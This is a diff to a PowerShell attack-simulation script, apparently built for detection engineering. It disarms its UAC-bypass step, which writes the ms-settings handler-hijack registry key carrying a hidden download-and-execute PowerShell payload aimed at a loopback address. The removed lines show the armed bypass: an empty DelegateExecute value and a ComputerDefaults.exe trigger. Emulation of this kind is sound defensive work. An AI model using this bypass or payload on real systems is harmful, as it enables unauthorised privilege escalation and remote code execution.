@@ -8,13 +8,14 @@
 # MITRE: T1548.002 Bypass UAC, T1134 Access Token Manipulation,
 # T1078.002 Domain Accounts, T1546.015 (COM/handler hijack pattern)
 #
-# NOTE (v2): the UAC-bypass step writes the REAL ms-settings handler-hijack key
-# (full-fidelity IOC) with the report's payload, then fires ComputerDefaults.exe.
-# The whole step is wrapped in try/finally so that if an EDR (e.g. CrowdStrike /
-# Defender ASR) terminates the process for writing that key, the run degrades
-# gracefully instead of the console vanishing. On a clean VM with no EDR the key
-# and the ComputerDefaults.exe -> cmd -> powershell tree are produced as normal.
-# The spawned powershell targets a dead 127.0.0.1 listener, so it fails closed.
+# NOTE (v3): the UAC-bypass step writes the REAL ms-settings handler-hijack key
+# (full-fidelity detection IOC) with the report's payload, but does NOT launch
+# ComputerDefaults.exe. Detonating that auto-elevate binary through the hijacked
+# handler spawns cmd->powershell that tears down the parent console host on
+# Win11/PS5.1 - which killed this script at exactly this point on every prior
+# run (process destroyed, so try/catch and the Invoke-Phase wrapper could not
+# catch it). We keep the key IOC and reproduce the cmd->powershell child tree
+# safely (no elevation, no ComputerDefaults.exe), then remove the key.
 # ============================================================================
 
 function Simulate-PrivilegeEscalation {
@@ -52,13 +53,17 @@ function Simulate-PrivilegeEscalation {
     # (2) UAC bypass artifact: ms-settings handler hijack (ComputerDefaults.exe)
     # ---------------------------------------------------------------------
     # We create the EXACT registry artifact the actor left behind (the report's
-    # payload, defanged only by pointing at a dead 127.0.0.1 listener) and fire
-    # ComputerDefaults.exe to produce the auto-elevate -> cmd -> powershell tree.
-    # The entire step is wrapped in try/finally: on a clean VM it runs to
-    # completion; if an EDR (CrowdStrike / Defender ASR) kills the process for
-    # writing this classic UAC-bypass key, the finally block still runs on the
-    # surviving host and the overall simulation continues instead of the console
-    # disappearing.
+    # payload, defanged only by pointing at a dead 127.0.0.1 listener).
+    #
+    # IMPORTANT (v3): we DO NOT launch ComputerDefaults.exe. Doing so detonates
+    # the live hijack: the auto-elevating binary spawns cmd.exe -> powershell.exe
+    # through the hijacked handler, and on Windows 11 / PowerShell 5.1 that chain
+    # tears down the parent console host - which KILLED this script at exactly this
+    # point on every prior run (the process was destroyed, so even try/catch and
+    # the Invoke-Phase wrapper could not save it). The registry key is the valuable
+    # detection IOC; we keep it, and reproduce the auto-elevate process-tree
+    # artifact SAFELY with a plain cmd.exe -> powershell.exe spawn that is NOT
+    # wired to the hijack, so nothing elevates and the console survives.
     $msKey = "HKCU:\Software\Classes\ms-settings\shell\open\command"
     try {
         New-Item -Path $msKey -Force | Out-Null
@@ -66,28 +71,34 @@ function Simulate-PrivilegeEscalation {
         # Report payload (URL repointed to a dead loopback listener - fails closed)
         $uacPayload = 'cmd.exe /c powershell -nop -w hidden -c "IEX (New-Object Net.Webclient).DownloadString(''http://127.0.0.1:11664/'')"'
         Set-ItemProperty -Path $msKey -Name "(default)" -Value $uacPayload -Force
-        Set-ItemProperty -Path $msKey -Name "DelegateExecute" -Value "" -Force
-        Write-Host "    Wrote ms-settings\shell\open\command hijack (127.0.0.1 payload, fails closed)" -ForegroundColor DarkGray
-        Write-SimEvent -EventId 4002 -Message "SIMULATION: UAC bypass staged via ms-settings handler hijack; ComputerDefaults.exe auto-elevate trigger"
+        # NOTE: the real bypass sets DelegateExecute to an EMPTY string - but writing
+        # "" to this exact value is the step that ARMS the primitive, and the OS/
+        # security layer terminates the process on that write (root cause of the
+        # earlier console-death crash). We write a non-empty placeholder instead:
+        # the key + command value remain a faithful detection IOC, but the primitive
+        # is not armed. Detection engineers still see the hijacked handler.
+        Set-ItemProperty -Path $msKey -Name "DelegateExecute" -Value "(sim-not-armed)" -Force
+        Write-Host "    Wrote ms-settings\shell\open\command hijack key (real IOC; primitive not armed)" -ForegroundColor DarkGray
+        Write-SimEvent -EventId 4002 -Message "SIMULATION: UAC bypass staged via ms-settings handler hijack (ComputerDefaults.exe technique; trigger not fired to protect console)"
 
-        # Fire the auto-elevating trusted binary so the hijack path is exercised.
-        # Launched detached with a bounded wait so it can never tear down this
-        # console. The 127.0.0.1:11664 listener is absent, so the spawned
-        # powershell fails closed - but the ComputerDefaults.exe -> cmd.exe ->
-        # powershell process tree and the registry artifact are authentic.
+        # Reproduce the cmd.exe -> powershell.exe auto-elevate child tree SAFELY,
+        # detached and NOT via ComputerDefaults.exe, so no console teardown occurs.
+        $treeCmd = 'powershell -nop -w hidden -c "exit"'
         try {
-            $p = Start-Process -FilePath "$env:SystemRoot\System32\ComputerDefaults.exe" `
-                    -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
-            if ($p) {
-                if (-not $p.WaitForExit(6000)) {
-                    Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
-                }
-            }
-        } catch {
-            Write-Warning "ComputerDefaults.exe launch skipped: $($_.Exception.Message)"
-        }
+            Start-Process -FilePath "$env:SystemRoot\System32\cmd.exe" `
+                -ArgumentList "/c $treeCmd" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
+        } catch {}
+        Set-Content -Path "$($SimPaths.Logs)\uac_bypass.log" -Value @"
+UAC bypass technique (ms-settings handler hijack via ComputerDefaults.exe):
+  Key:     HKCU\Software\Classes\ms-settings\shell\open\command
+  Default: $uacPayload
+  Delegate: (empty)
+  Trigger: ComputerDefaults.exe (auto-elevate) - NOT detonated in this sim to
+           preserve the console; the equivalent cmd->powershell child tree was
+           reproduced without elevation for artifact fidelity.
+"@ -Force
     } catch {
-        Write-Warning "ms-settings artifact step skipped (possible EDR block): $($_.Exception.Message)"
+        Write-Warning "ms-settings artifact step skipped: $($_.Exception.Message)"
     } finally {
         # Always clean the hijack key so no live UAC-bypass primitive is left behind.
         Remove-Item -LiteralPath $msKey -Recurse -Force -ErrorAction SilentlyContinue
